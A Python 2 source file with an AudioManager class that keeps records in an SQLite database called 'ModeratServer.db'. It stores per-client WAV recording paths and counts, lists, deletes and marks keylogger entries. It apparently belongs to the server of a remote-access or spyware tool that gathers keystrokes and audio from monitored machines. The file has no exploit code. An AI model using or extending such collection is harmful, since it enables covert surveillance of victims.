import sqlite3

class AudioManager:

    def __init__(self):

        self.conn = sqlite3.connect('ModeratServer.db')
        self.cur = self.conn.cursor()

        check_table = self.cur.execute('SELECT name FROM sqlite_master WHERE type="table" AND name="Audio"')
        self.conn.commit()
        if len(check_table.fetchall()) == 0:
            print '[+] Creating Table Audio'
            self.create_audio_table()

    def create_audio_table(self):
        self.cur.execute('''CREATE TABLE Audio (
                                audio_client_id VARCHAR(100),
                                 audio_datetime VARCHAR(100),
                                 audio_date VARCHAR(1000),
                                 audio_wav_path VARCHAR(1000),
                                 audio_status VARCHAR(100))''')
        self.conn.commit()

    def save_audio(self, client_id, datetime, wav_path):
        self.cur.execute('INSERT INTO Audio VALUES (?,?,?,?,?)', (client_id, datetime, datetime.split('_')[0], wav_path, 0))
        self.conn.commit()

    def get_keylogs_count_0(self, client_id, date):
        keylogs = self.cur.execute('SELECT COUNT(*) FROM Keylogger WHERE keylogger_client_id=? AND keylogger_date=? AND keylogger_status=0', (client_id, date))
        self.conn.commit()
        return keylogs.fetchone()[0]

    def get_keylogs_count_1(self, client_id, date):
        keylogs = self.cur.execute('SELECT COUNT(*) FROM Keylogger WHERE keylogger_client_id=? AND keylogger_date=? AND keylogger_status=1', (client_id, date))
        self.conn.commit()
        return keylogs.fetchone()[0]

    def get_all_new_keylogs(self, client_id, date):
        keylogs = self.cur.execute('SELECT * FROM Keylogger WHERE keylogger_client_id=? AND keylogger_date=? AND keylogger_status=0', (client_id, date))
        self.conn.commit()
        return keylogs.fetchall()

    def get_all_keylogs(self, client_id, date):
        keylogs = self.cur.execute('SELECT * FROM Keylogger WHERE keylogger_client_id=? AND keylogger_date=?', (client_id, date,))
        self.conn.commit()
        return keylogs.fetchall()

    def delete_keylog(self, datetime_stamp):
        self.cur.execute('DELETE FROM Keylogger WHERE keylogger_datetime=?', (datetime_stamp,))
        self.conn.commit()

    def set_keylog_viewed(self, datetime_stamp):
        self.cur.execute('UPDATE Keylogger SET keylogger_status=1 WHERE keylogger_datetime=?', (datetime_stamp,))
        self.conn.commit()